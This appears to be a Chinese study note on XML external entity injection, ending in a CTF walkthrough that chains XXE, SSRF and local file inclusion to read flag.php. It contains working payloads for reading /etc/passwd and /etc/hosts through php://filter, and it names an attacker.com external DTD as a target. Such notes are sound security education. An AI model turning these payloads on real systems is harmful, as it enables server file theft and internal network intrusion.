# XXE（XML外部实体注入）

### XML：

XML（eXtensible Markup Language，可扩展标记语言）是一种用于存储和传输数据的标记语言。它被设计用来结构化、存储和传输信息，同时保持人类可读和机器可读的特性。它被设计为具有自我描述性，并且是W3C的推荐标准。

作为数据交换的标准格式，在Web服务、配置文件、数据存储等领域广泛应用。然而，正是其强大的可扩展性设计，隐藏着一个危险的攻击向量——XML外部实体注入（XXE）。

##### XML的核心特点：

- **可扩展**：用户自定义标签
- **平台无关**：不依赖任何编程语言或操作系统
- **自描述性**：数据和结构一起存储
- **严格的语法规则**：必须格式良好

### 什么是XXE?

XML外部实体注入（XXE）是一种web安全漏洞，允许攻击者干扰应用程序对XML数据的处理。此类漏洞使攻击者能够查看应用服务器文件系统中的文件，并于应用程序本身可访问的任何后端或外部系统进行交互。

在某些情况下，攻击者可利用XXE漏洞实施SSRF攻击，从而将XXE攻击升级位针对底层服务器或其他后端基础设施的攻击手段。

![image-20251227165251637](C:\Users\赵念\AppData\Roaming\Typora\typora-user-images\image-20251227165251637.png)

### XXE攻击所包含的类型：

- 利用XXE漏洞检索文件，即通过定义包含文件内容的外部实体，使其在应用程序响应中返回
- 利用XXE漏洞施行SSRF攻击，其中外部实体基于指向后端系统的URL进行定义
- 利用盲XXE漏洞实现带外数据外泄，即敏感数据从应用服务器传输至攻击者控制的系统
- 利用盲XXE漏洞通过错误消息获取数据，攻击者可触发包含敏感数据的解析错误消息



### 利用XXE漏洞检索文件



### 利用XXE漏洞实行SSRF攻击





### 发现XXE注入的隐藏攻击面

在许多情况下，XXE注入漏洞的攻击面显而易见，因为应用程序的常规HTTP流量中包含了含有XML格式数据的请求。而在其他情况下，攻击面则不太明显。但若在正确的位置进行排查，即使在不含任何XML的请求中，也能发现XXE攻击面。

#### Xinclude 攻击

某些应用程序接收客户端提交的数据，将其嵌入服务器端的XML文档中，然后解析该文档。例如，当客户端提交的数据被放入后端SOAP请求中，随后由后端SOAP服务进行处理时，就会发生这种情况。

在此情况下，您无法实施经典的XXE攻击，因为您无法控制整个XML文档，因此无法定义或修改DOCTYPE<element>元素。不过，您或许可以改用`XInclude<subdocument>`XInclude元素。该元素是XML规范的一部分，允许通过子文档构建XML文档。 攻击者可在XML文档的任意数据值中植入攻击XInclude代码，因此即使仅能控制单个数据项（该数据项将被写入服务器端的XML文档），此类攻击仍可实施。

要执行攻击`XInclude`，您需要引用命名`XInclude`空间并提供要包含的文件路径。例如：

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"> <xi:include parse="text" href="file:///etc/passwd"/></foo>
```





#### 通过文件上传的XXE攻击







### 通过修改内容类型实施XXE攻击

大多数POST请求使用HTML表单生成的默认内容类型，例如`application/x-www-form-urlencoded`。某些网站期望接收此格式的请求，但也会容忍其他内容类型，包括XML

例如，如果一个正常请求包含以下内容：

```
POST /action HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 7 
foo=bar
```

那么您或许可以提交以下请求，结果相同：

```
POST /action HTTP/1.0 
Content-Type: text/xml 
Content-Length: 52 
<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```

如果应用程序允许请求在消息正文中包含XML，并将其解析为XML格式，那么只需将请求重新格式化为XML格式，即可触发隐藏的XXE攻击面。





### XXE漏洞的实际利用：

```
尝试读/etc/hosts

<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE ANY [  
<!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">   
]>  
<root>&shit;</root> 
```

**目标：**

> 在存在 XXE 漏洞的 XML 解析环境中，读取服务器本地文件 `/etc/hosts`，并把内容“回显”到 XML 解析结果中。

#### XML 声明（不是漏洞点）

```
<?xml version="1.0" encoding="UTF-8"?>
```

这是标准 XML 头，说明：

- XML 版本 1.0
- UTF-8 编码

**对漏洞本身无影响**，只是让解析器愿意接收它。

#### DOCTYPE —— XXE 的核心入口

```
<!DOCTYPE ANY [
```

##### 1. 什么是 DOCTYPE？

`DOCTYPE` 用于声明：

- 文档类型
- DTD（Document Type Definition）

DTD 的作用是：

- 定义“这个 XML 里允许出现哪些实体、结构”

##### 2. 为什么 XXE 一定要用 DOCTYPE？

**因为：**

- 外部实体（External Entity）只能在 DTD 中定义
- 如果解析器允许加载 DTD，就可能被利用

⚠️ **安全本质**：

> XXE = XML 解析器 + 允许外部实体 + 未做安全限制

#### ENTITY —— 外部实体定义（漏洞利用点）

```
<!ENTITY shit SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
```

这是整个 payload 的**关键行**。

------

##### 1. ENTITY 是什么？

ENTITY = **实体**
 可以理解为 **XML 里的变量 / 宏**。

示例（普通实体）：

```
<!ENTITY test "hello">
```

使用：

```
<root>&test;</root>
```

解析后：

```
<root>hello</root>
```

##### 2. 外部实体（SYSTEM）的含义

```
<!ENTITY 名称 SYSTEM "URI">
```

含义：

> 当解析器遇到 `&名称;` 时，
>  会去加载 `SYSTEM` 指定的资源内容

**SYSTEM 后面不一定是 URL，可以是：**

- file:///etc/passwd
- http://attacker.com/evil.dtd
- php://filter/...
- expect://
- ftp://
- 等

##### 3. 为什么这里用 php://filter？

```
php://filter/read=convert.base64-encode/resource=/etc/hosts
```

这是 **PHP 特有的流封装器（Stream Wrapper）**。

##### 拆解：

| 部分                       | 含义                       |
| -------------------------- | -------------------------- |
| php://filter               | PHP 的流处理机制           |
| read=convert.base64-encode | 对读取内容进行 base64 编码 |
| resource=/etc/hosts        | 实际要读取的文件           |

##### 等价逻辑（伪代码）：

```
$content = file_get_contents("/etc/hosts");
echo base64_encode($content);
```



#### XXE——内网访问

```
<!ENTITY shit SYSTEM
"php://filter/read=convert.base64-encode/resource=http://172.17.0.2/index.php">
```

2. 为什么 XXE 可以访问 HTTP？
原因不是 XXE 本身，而是 PHP
XXE 的 SYSTEM 本质：让解析器读取一个 URI

PHP 允许 `file_get_contents()` / `libxml` 读取：

- file://

- http://

- ftp://

- php://


所以本质是：

XXE + PHP stream wrapper = SSRF

3. php://filter 在这里的作用（不是必须，但很成熟）
如果直接写：

```
SYSTEM "http://172.17.0.2/index.php"
```

可能的问题：

可能的问题：

HTML 中有 <、>，破坏 XML

输出乱码

回显被截断

base64 的价值：

保证 XML 安全

保证完整回显

标准 CTF 操作

4. 攻击链总结（第一段）
nginx
Copy code
XXE
 └─> php://filter
      └─> http://172.17.0.2
           └─> 内网 Web 服务
你已经完成了一次 XXE → SSRF → Web 服务探测

#### 阶段 3：内网 Web 源码审计（LFI 识别）

##### 1. 内网 index.php 代码回顾

```
error_reporting(0);
include "flag.php";

if(!$_GET['file'])
{
    echo file_get_contents("./index.php");
}

$file=$_GET['file'];

if(strstr($file,"../")||stristr($file, "tp")||
   stristr($file,"input")||stristr($file,"data"))
{
    echo "Oh no!";
    exit();
}

include($file);
```

------

##### 2. 漏洞点逐条分析

##### （1）源码泄露机制

```
if(!$_GET['file']) {
    echo file_get_contents("./index.php");
}
```

- 没传 `file` 参数 → 直接读自身源码
- 这一步**方便选手审计**

------

##### （2）核心危险点：`include($file)`

```
include($file);
```

- 用户可控
- 没有路径限定
- 没有 `realpath`
- 只做了**黑名单过滤**

👉 **典型 LFI（本地文件包含）**

------

##### （3）过滤为什么是“假的”？

```
if (
  strstr($file,"../") ||
  stristr($file,"tp") ||
  stristr($file,"input") ||
  stristr($file,"data")
)
```

##### 黑名单特征

- 只过滤字符串
- 不理解 PHP stream
- 不理解编码
- 不理解多层解析

**这意味着：**

> `php://filter` 是天然绕过手段

------

##### 3. flag.php 已被 include 但未输出？

```
include "flag.php";
```

说明：

- flag.php **存在**
- 但没有 `echo`
- flag 存在变量中或被屏蔽

👉 你必须**主动读取 flag.php 的内容**

------

##### 四、阶段 4：XXE + LFI 的“套娃式利用”

这是整道题**最核心、最漂亮的部分**。

------

##### 1. Payload 回顾（重点）

```
<!ENTITY shit SYSTEM
"php://filter/read=convert.base64-encode/resource=
http://172.17.0.2/index.php?
file=php://filter/read=convert.base64-encode/resource=flag.php">
```

我们**从内到外拆解**。

------

##### 2. 内层：内网 LFI Payload

##### 访问的真实 URL 是：

```
http://172.17.0.2/index.php?
file=php://filter/read=convert.base64-encode/resource=flag.php
```

##### 内网 PHP 执行逻辑：

```
include(
  "php://filter/read=convert.base64-encode/resource=flag.php"
);
```

PHP 会做什么？

1. 打开 `flag.php`
2. base64 编码其内容
3. include 输出结果

**注意：**

- include 的是“编码后的字符串”
- 不会执行 PHP 代码
- 只会原样输出

------

## 3. 外层：XXE 再次 base64

### 外层结构

```
SYSTEM "php://filter/read=convert.base64-encode/resource=http://..."
```

所以你得到的是：

```
base64(
    HTTP响应(
        base64(flag.php)
    )
)
```

------

##### 4. 为什么要“套两层 base64”？

##### 原因一：链式安全

- 内层：绕过 LFI 执行
- 外层：保证 XXE XML 安全

##### 原因二：避免解析歧义

- PHP → XML → HTTP
- 每一层都有字符限制
- base64 是“通行证”

------

##### 5. 解码顺序（必须理解）

```
响应
 └─ base64 decode ①
      └─ 得到 内网响应
           └─ base64 decode ②
                └─ flag.php 内容
```

**顺序错一次，数据就废**

------

#### 五、完整攻击链总结（一行版）

```
XXE
 └─> SSRF
      └─> 内网 Web
           └─> LFI
                └─> php://filter
                     └─> flag.php
```

这是一个**标准的多漏洞协同利用模型**。